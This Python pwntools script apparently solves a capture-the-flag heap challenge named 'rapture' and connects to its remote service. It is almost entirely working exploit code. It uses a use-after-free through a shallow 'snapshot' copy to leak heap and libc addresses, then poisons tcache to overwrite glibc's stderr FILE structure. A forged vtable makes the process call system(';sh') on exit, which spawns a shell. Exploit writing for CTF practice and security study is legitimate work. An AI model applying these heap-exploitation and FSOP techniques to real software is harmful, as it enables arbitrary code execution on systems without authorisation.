#!/usr/bin/env python3

from pwn import *

exe = ELF("./rapture_patched")
libc = ELF("./libc-chall.so")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("rapture-b2f20940f9c8.chals.z0d1ak.org", 1337, ssl = True)

    return r


def alloc(idx: int, size: bytes):
    r.sendlineafter(b"diver> ", b"1")
    r.sendlineafter(b"cell index> ", str(idx).encode())
    r.sendlineafter(b"ballast size> ", str(size).encode())
    r.recvuntil(b"cell requisitioned\n")


def write(idx: int, data: bytes):
    r.sendlineafter(b"diver> ", b"2")
    r.sendlineafter(b"cell index> ", str(idx).encode())
    r.send(data)

    # The program performs read() until the requested size is satisfied,
    # so append no newline unless you specifically want it in the payload.
    r.recvuntil(b"cell recalibrated\n")


def free(idx: int):
    r.sendlineafter(b"diver> ", b"3")
    r.sendlineafter(b"cell index> ", str(idx).encode())
    r.recvuntil(b"cell jettisoned\n")


def inspect(idx: int):
    r.sendlineafter(b"diver> ", b"4")
    r.sendlineafter(b"cell index> ", str(idx).encode())

    data = r.recvuntil(b"\n", drop=True)
    return data


def snapshot(src: int, dst: int):
    r.sendlineafter(b"diver> ", b"5")
    r.sendlineafter(b"source index> ", str(src).encode())
    r.sendlineafter(b"backup index> ", str(dst).encode())
    r.recvuntil(b"redundancy snapshot committed\n")


def exit():
    r.sendlineafter(b"diver> ", b"6")
    r.recvuntil(b"Blowing ballast... surfacing.\n")


def main():
    r = conn()

    alloc(0, 0x18)
    snapshot(0, 1)      # Shallow-copy of chunk 0
    free(0)

    heap = int.from_bytes(inspect(1)[:5], "little") << 12
    log.info(f"heap: {heap:#x}")

    # Now we have to do:
    #   1. Fill tcache;
    #   2. Allocate an unsortedbin chunk;
    #   3. Free it (avoid consolidation with top_chunk);
    #   4. Leak libc.
    #
    for idx in range(2, 9):
        alloc(idx, 0xf8)

    # This will help us leak libc
    alloc(9, 0xf8)
    alloc(10, 0x28)    # Avoid consolidation

    for idx in range(2, 9):
        free(idx)

    snapshot(9, 11)
    free(9)

    libc.address = u64(inspect(11)[:8].ljust(8, b"\x00")) - (libc.sym.main_arena + 96)
    log.info(f"libc: {libc.address:#x}")

    for idx in range(2, 10):
        alloc(idx, 0xf8)

    # Now we have to:
    #   1. Do tcache poisoning to alloc a chunk to arbitrary address (prob &stderr);
    #   2. FSOP for the win;
    #   3. Exit to trigger the FSOP;
    #   4. Go to sleep.
    #
    for idx in range(12, 15):
        alloc(idx, 0xe8)

    snapshot(12, 15)

    for idx in range(14, 11, -1):
        free(idx)

    target = libc.sym._IO_2_1_stderr_ ^ (heap >> 12)
    write(15, p64(target) + b"\x00" * 0xe0)

    alloc(12, 0xe8)
    alloc(13, 0xe8)

    fp = FileStructure(0)
    fp.flags = p32(0xfbad0101) + b";sh\x00"
    fp._IO_save_end = libc.sym.system
    fp._lock = libc.sym._IO_2_1_stderr_ - 0x10
    fp._wide_data = libc.sym._IO_2_1_stderr_ - 0x10
    fp.vtable = libc.sym._IO_wfile_jumps + 0x18 - 0x58
    
    payload = bytearray(bytes(fp))
    payload[0xc0:0xc4] = p32(1)     # Set _mode
    payload[0xd0:0xd8] = p64(libc.sym._IO_2_1_stderr_ - 0x10)   # Set _unused2
    payload += p64(0xfbad2887)

    write(13, payload)
    exit()

    r.interactive("$ ")


if __name__ == "__main__":
    main()
